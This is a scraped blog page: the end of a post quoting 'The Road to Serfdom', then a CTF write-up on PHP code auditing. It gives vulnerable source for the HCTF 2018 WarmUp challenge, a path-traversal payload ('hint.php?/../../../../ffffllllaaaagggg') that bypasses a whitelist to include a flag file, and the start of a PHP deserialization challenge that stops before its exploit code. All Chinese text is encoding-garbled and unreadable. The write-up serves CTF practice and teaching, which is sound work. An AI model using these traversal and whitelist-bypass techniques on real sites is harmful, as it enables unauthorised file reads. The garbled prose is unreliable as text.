<li>å„ä¸ªäººçš„æ•™è‚²å’ŒçŸ¥è¯†è¶Šé«˜ï¼Œä»–ä»¬çš„è§è§£å’Œå—œå¥½å°±è¶Šä¸ç›¸åŒï¼Œè€Œä»–ä»¬èµåŒæŸä¸€ç§ä»·å€¼ç­‰çº§åˆ¶åº¦çš„å¯èƒ½æ€§å°±è¶Šå°‘ã€‚ä»–ä¼šå¾—åˆ°ä¸€åˆ‡æ€§æƒ…æ¸©é¡ºå’Œæ˜“å—éª—çš„äººçš„æ”¯æŒï¼Œè¿™äº›äººæ²¡æœ‰è‡ªå·±çš„åšå¼ºä¿¡å¿µï¼Œè€Œåªå‡†å¤‡æ¥å—ä¸€ä¸ªç°æˆçš„ä»·å€¼æ ‡å‡†ä½“ç³»ï¼Œåªè¦ç»å¸¸å¤§å£°åœ°æœä»–ä»¬çš„è€³æœµé¼“å¹è¿™ç§ä½“ç³»ã€‚</li>
<li>äººä»¬åŒæ„ä¸€ä¸ªæ¶ˆæçš„çº²é¢†â€”â€”å¯¹æ•Œäººçš„æ†æ¨ï¼Œå¯¹å¯Œäººçš„å«‰å¦’â€”â€”æ¯”åŒæ„ä¸€ä»¶ç§¯æçš„ä»»åŠ¡è¦å®¹æ˜“äº›ã€‚</li>
<li>shä¸»ä¹‰åªæœ‰å½“å®ƒä»ç„¶æ˜¯ç†è®ºçš„æ—¶å€™ï¼Œå®ƒæ‰æ˜¯å›½é™…ä¸»ä¹‰çš„ï¼Œä½†ä¸€ç»ä»˜è¯¸å®é™…ï¼Œæ— è®ºæ˜¯åœ¨å¾·å›½è¿˜æ˜¯ä¿„å›½ï¼Œå®ƒå°±é©¬ä¸Šå˜æˆå¼ºçƒˆçš„å›½å®¶ä¸»ä¹‰äº†ã€‚</li>
<li>ä¸€ä¸ªäººåªå› ä¸ºä»–æ˜¯é‚£ä¸ªé›†å›¢çš„æˆå‘˜æ‰æ”¶åˆ°å°Šæ•¬â€”â€”è€Œä¸”åªæœ‰ä»–ä¸ºå…¬è®¤çš„å…±åŒç›®æ ‡è€Œå·¥ä½œæ‰æ”¶åˆ°å°Šæ•¬â€”â€”å¹¶ä¸”ä»–ä¹‹æ‰€ä»¥å–å¾—ä»–çš„å…¨éƒ¨å°Šä¸¥ï¼Œåªæ˜¯ä»ä»–çš„æˆå‘˜çš„èµ„æ ¼è€Œä¸ä»…æ˜¯ä»ä»–æ˜¯ä¸€ä¸ªäººçš„èµ„æ ¼ã€‚</li>
<li>æƒ³æŠŠè‡ªå·±ä¸ä¸€ä¸ªé›†å›¢ç»“ä¸ºä¸€ä½“çš„ä¸ªäººæ„¿æœ›ï¼Œå¸¸å¸¸æ˜¯ä¸€ç§è‡ªå‘æ„Ÿæ‰€å¼•èµ·çš„ï¼Œåªæœ‰é‚£ä¸ªé›†å›¢çš„æˆå‘˜èµ„æ ¼èƒ½å¤Ÿä½¿ä»–æ¯”ä¸å±è¿™ä¸ªé›†å›¢çš„äººé«˜å‡ºä¸€ç­‰ï¼Œæ‰ä¼šæ»¡è¶³ä»–çš„éœ€è¦ã€‚</li>
<li>åœ¨æƒ³è±¡ä¸­è®¤ä¸ºè‡ªå·±æ˜¯é“å¾·çš„ï¼Œå› ä¸ºä»–ä»¬å·²æŠŠè‡ªå·±çš„ä¸åˆ°çš„ç§»è®©ç»™è¶Šæ¥è¶Šå¤§çš„é›†å›¢ï¼ˆå°¼å¸ƒå°”ï¼‰</li>
<li>â€œä¸ºäº†ç›®çš„ï¼Œä¸æ‹©æ‰‹æ®µâ€è¿™ä¸ªåŸåˆ™ï¼Œåœ¨ä¸ªäººä¸»ä¹‰é“å¾·é‡Œé¢è¢«è®¤ä¸ºæ˜¯å¯¹ä¸€åˆ‡é“å¾·çš„å¦å®šã€‚è€Œåœ¨é›†ä½“ä¸»ä¹‰çš„é“å¾·æå´æˆä¸ºäº†å¿…ç„¶çš„è‡³é«˜æ— ä¸Šçš„å‡†åˆ™ï¼›åšå†³å½»åº•çš„é›†ä½“ä¸»ä¹‰è€…ä¸€å®šä¸è®¸åšçš„äº‹å‡ ä¹ä¸å­˜åœ¨ï¼Œå¦‚æœå®ƒæœ‰åŠ©äºâ€œæ•´ä½“çš„åˆ©ç›Šâ€ï¼Œå› ä¸ºè¿™ä¸ªâ€œæ•´ä½“çš„åˆ©ç›Šâ€æ˜¯ä»–åˆ¤å®šåº”å½“åšä»€ä¹ˆçš„å”¯ä¸€æ ‡å‡†ã€‚</li>
<li>è¦ä½¿å¤§å¤šæ•°äººå¤±å»ç‹¬ç«‹æ€è€ƒæ˜¯ä¸éš¾çš„ï¼Œä½†ä¹Ÿå¿…é¡»ä½¿é‚£äº›ä»ç„¶ä¿ç•™ç€ä¸€ç§æ‰¹åˆ¤çš„å€¾å‘çš„å°‘æ•°äººæ²‰é»˜ä¸‹æ¥ã€‚</li>
<li>åœ¨å„ä¸ªææƒä¸»ä¹‰å›½å®¶é‡Œï¼Œè¿™äº›å­¦ç§‘ï¼ˆå†å²ã€æ³•å¾‹æˆ–ç»æµå­¦ï¼‰å·²æˆäº†åˆ¶é€ å®˜æ–¹ç¥è¯çš„å·¥å‚ï¼Œè€Œç»Ÿæ²»è€…å°±ç”¨è¿™äº›ç¥è¯æ¥æ”¯é…äººæ°‘çš„å¿ƒç†å’Œæ„å¿—ã€‚</li>
<li>åœ¨ä»»ä½•ç¤¾ä¼šé‡Œï¼Œæ€æƒ³çš„è‡ªç”±å¯èƒ½åªå¯¹å°‘æ•°äººæ‰æœ‰ç›´æ¥çš„æ„ä¹‰ã€‚å—åˆ°å½±å“çš„äººå°†ä¼šæŠŠä¸€åˆ‡è¿‡å¤±éƒ½å½’äºä¸€ä¸ªå®¹æ˜“çœ‹è§çš„ï¼Œç›´æ¥çš„å’Œå¯ä»¥é¿å…çš„åŸå› ä¸Šå»ï¼Œè€Œå†³å®šè¿™ç§å˜åŒ–çš„æ›´å¤æ‚çš„ç›¸äº’å…³ç³»ä¸å¯é¿å…çš„è®©ç„¶æ˜¯ä»–ä»¬æ‰€çœ‹ä¸åˆ°çš„ã€‚</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/19/%E6%91%98%E6%8A%84-%E3%80%8A%E9%80%9A%E5%BE%80%E5%A5%B4%E5%BD%B9%E4%B9%8B%E8%B7%AF%E3%80%8B/" data-id="ckk41dxs80000hgus17j44msk" data-title="æ‘˜æŠ„-ã€Šé€šå¾€å¥´å½¹ä¹‹è·¯ã€‹" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E5%AD%A6/" rel="tag">æ–‡å­¦</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-PHPä»£ç å®¡è®¡" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/19/CTF-Web-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="article-date">
  <time class="dt-published" datetime="2021-01-19T08:15:16.000Z" itemprop="datePublished">2021-01-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/19/CTF-Web-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">CTF_Web PHPä»£ç å®¡è®¡</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HCTF%202018]WarmUp">https://buuoj.cn/challenges#[HCTF%202018]WarmUp</a></p>
<p>æ€è·¯ï¼š</p>
<p><strong>ç¬¬ä¸€æ­¥</strong></p>
<p>è¿›å…¥ç•Œé¢ï¼Œåªæœ‰ä¸€ä¸ªæ»‘ç¨½è¡¨æƒ…ã€‚</p>
<p>æŸ¥çœ‹æºç ï¼Œæç¤ºè®¿é—®source.php</p>
<p><strong>ç¬¬äºŒæ­¥</strong></p>
<p>è®¿é—®source.php</p>
<p>å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment"># ç™½åå•</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment"># è‹¥æ²¡æœ‰pageæˆ–pageä¸æ˜¯å­—ç¬¦ä¸²ï¼Œé€€å‡º</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># è‹¥pageåœ¨ç™½åå•ä¸­ï¼Œè¿”å›trueã€‚in_arrayä¸ºåˆ¤æ–­å‰è€…æ˜¯å¦åœ¨åè€…ä¸­</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># mb_substr(string, start, length)</span></span><br><span class="line">            <span class="comment"># mb_strpos(haystack, needle, offset, encoding) æŸ¥æ‰¾needleåœ¨haystackä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment"># å†æ¬¡åˆ¤æ–­ç™½åå•</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="comment"># å†æ¬¡å»é™¤æœ«å°¾ï¼Ÿ</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>å®¡è®¡åå¾—çŸ¥ï¼Œè¿˜æœ‰ä¸€ä¸ªhint.php</p>
<p><strong>ç¬¬ä¸‰æ­¥</strong></p>
<p>è®¿é—®hint.phpï¼Œæç¤ºflag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p><strong>ç¬¬å››æ­¥</strong></p>
<p>å›åˆ°source.phpï¼Œåªæœ‰æäº¤çš„fileå˜é‡æ»¡è¶³checkFileçš„è¿‡æ»¤æ¡ä»¶æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œå…³é”®è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $_REQUEST[&#39;file&#39;];</span><br></pre></td></tr></table></figure>
<p>è€Œincludeæœ‰ä¸€ä¸ªæŠ€å·§ï¼Œå³include â€œwrongname/flag.txtâ€æ—¶ï¼Œç”±äºæ·»åŠ äº†å…³é”®ç¬¦å·/ï¼Œåé¢çš„flag.txtä¼šè¢«includeå‡½æ•°è§£æï¼Œæ­¤æ—¶é€šè¿‡payloadç»•è¿‡éªŒè¯å³å¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>æ­¤å¤„æ³¨æ„ï¼Œç½‘ä¸Šä¸€äº›wpå¤šä½™äº†æ­¥éª¤ï¼Œå°†ï¼Ÿè¿›è¡Œäº†åŒé‡URLç¼–ç ï¼Œå…¶å®å¤§å¯ä¸å¿…ï¼Œåªè¦ç¬¬ä¸€æ¬¡æ£€éªŒï¼Ÿåè¿”å›trueå³å¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9e564e10-3e8c-472d-a9fa-41b3d29adf50&#125; </span><br></pre></td></tr></table></figure>
<h2 id="includeç›®å½•ç©¿é€"><a href="#includeç›®å½•ç©¿é€" class="headerlink" title="includeç›®å½•ç©¿é€"></a>includeç›®å½•ç©¿é€</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å‚è€ƒï¼šhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;stevenonesir&#x2F;article&#x2F;details&#x2F;109862380</span><br><span class="line">ä¾‹å¦‚ï¼šinclude â€˜wrongname&#x2F;flag.txtâ€™</span><br><span class="line">wrongnameæ— æ³•è¢«æ­£ç¡®è¯»å–ï¼Œè¿™ä¸ªæ—¶å€™&#x2F;åé¢çš„flag.txtå°±ä¼šè¢«includeå‡½æ•°è¯»å–å¹¶è§£æã€‚</span><br></pre></td></tr></table></figure>
<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>æ¥æºï¼šæå®¢å¤§æŒ‘æˆ˜2019</p>
<p>é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP</a></p>
<p><strong>ç¬¬ä¸€æ­¥</strong></p>
<p>è¿›å…¥åˆ°é¡µé¢åï¼Œæç¤ºæœ‰å¤‡ä»½</p>
<p>é€šè¿‡wpï¼Œå¾—çŸ¥å¤‡ä»½ä¸º<a target="_blank" rel="noopener" href="http://www.zipæ–‡ä»¶(æ ¹æ®ç»éªŒ,æˆ–è€…éœ€è¦ä¸€ä¸ªç›®å½•çˆ†ç ´å­—å…¸)/">www.zipæ–‡ä»¶ï¼ˆæ ¹æ®ç»éªŒï¼Œæˆ–è€…éœ€è¦ä¸€ä¸ªç›®å½•çˆ†ç ´å­—å…¸ï¼‰</a></p>
<p><strong>ç¬¬äºŒæ­¥</strong></p>
<p>ä¸‹è½½åï¼Œå­˜åœ¨flag.phpï¼ˆæ— ç”¨ï¼‰ï¼Œindex.phpï¼Œclass.phpä¸‰ä¸ªæ–‡ä»¶</p>
<p>index.phpä¸­ï¼Œæœ‰æ•ˆä»£ç ç‰‡ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;select=&quot;</span>.<span class="variable">$select</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;br&gt;serialize=&quot;</span>.serialize(<span class="variable">$select</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¼•å…¥class.phpï¼Œæäº¤selectå˜é‡ï¼Œç„¶åå¯¹selectå˜é‡è¿›è¡Œåºåˆ—åŒ–</p>
<p>åˆ¤æ–­ä¸ºååºåˆ—åŒ–é¢˜ï¼Œå¹¶éœ€è¦ç»•è¿‡ä¸€äº›è¿‡æ»¤</p>
<p><strong>ç¬¬ä¸‰æ­¥</strong></p>
<p>åœ¨class.phpä¸­</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="comment"># ç”Ÿæˆæ–°å¯¹è±¡è‡ªåŠ¨æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># ååºåˆ—åŒ–å‰è§¦å‘</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾ï¼Œè¦æ‰§è¡ŒNameä¸‹çš„__destructå‡½æ•°ï¼Œå³å¯å¾—åˆ°flag</p>
<p>éœ€è¦ä¸¤ä¸ªæ¡ä»¶ï¼šusernameæ˜¯adminï¼Œpasswordæ˜¯100</p>
<p>éœ€è¦ç»•è¿‡__wakeup</p>
<p><strong>ç¬¬å››æ­¥</strong></p>
<p>ç¼–å†™ä»£ç </p>
